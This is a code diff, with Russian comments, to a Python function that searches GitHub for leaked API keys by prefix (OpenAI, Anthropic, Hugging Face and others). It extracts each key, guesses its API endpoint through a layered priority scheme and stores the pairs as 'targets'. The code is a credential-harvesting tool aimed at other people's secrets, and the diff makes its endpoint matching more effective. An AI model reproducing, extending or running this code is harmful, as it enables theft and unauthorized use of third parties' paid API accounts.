@@ -114,12 +114,7 @@ def fetch_github_targets():
     logger.info("🐙 Ищу ключи на GitHub...")
     headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
     
-    queries = [
-        "sk-proj- language:Python", "sk-ant-api03- language:Python", 
-        "sk-kimi- language:Python", "sk-cp- language:Python",
-        "sk-sp- language:Python", "hf_ language:Python", 
-        "sk- language:JSON", "sk- language:YAML", "sk- language:JavaScript"
-    ]
+    queries = ["sk-proj- language:Python", "sk-ant-api03- language:Python", "sk-kimi- language:Python", "sk-cp- language:Python", "sk-sp- language:Python", "hf_ language:Python", "sk- language:JSON", "sk- language:YAML"]
     query = random.choice(queries)
     page = random.randint(1, 10) 
     
@@ -144,18 +139,22 @@ def fetch_github_targets():
                             token = match.group(0)
                             api_urls = []
                             
+                            # ПРИОРИТЕТ 1: URL прямо в этой же строке
                             urls = URL_REGEX.findall(line)
                             for u in urls:
                                 if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']): continue
                                 match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
                                 if match_url: api_urls.append(match_url.group(1))
                             
-                            if not api_urls and p["provider"] in ["openai", "anthropic", "huggingface"]:
-                                api_urls.append(PROVIDER_ENDPOINTS[p["provider"]])
-                                
+                            # ПРИОРИТЕТ 2: Жесткий префикс ключа (для всех известных провайдеров)
+                            if not api_urls and p["provider"] != "generic-sk":
+                                api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
+                            
+                            # ПРИОРИТЕТ 3: URL в конфигах репозитория
                             if not api_urls:
                                 api_urls.extend(get_urls_from_repo_configs(repo)[:1])
                             
+                            # ПРИОРИТЕТ 4: Название переменной (только если всё остальное не сработало)
                             if not api_urls:
                                 var_match = re.search(r'([A-Za-z0-9_]+)\s*=', line)
                                 var_name = var_match.group(1).lower() if var_match else ""
@@ -165,16 +164,19 @@ def fetch_github_targets():
                                     if "openai" in var_name: api_urls.append(PROVIDER_ENDPOINTS["openai"])
                                     elif "anthropic" in var_name: api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
                             
+                            # ПРИОРИТЕТ 5: Название репозитория
                             if not api_urls:
                                 combined = (repo + " " + path).lower()
                                 for hint, url in REPO_HINTS.items():
                                     if hint in combined: api_urls.append(url); break
                                     
+                            # ПРИОРИТЕТ 6: Дефолт
                             if not api_urls:
-                                api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"], PROVIDER_ENDPOINTS["default"]))
+                                api_urls.append(PROVIDER_ENDPOINTS["default"])
                                 
                             for url in list(set(api_urls))[:1]:
-                                targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
+                                if url: # Проверка на None
+                                    targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
             time.sleep(0.2) 
             
         unique_targets = []
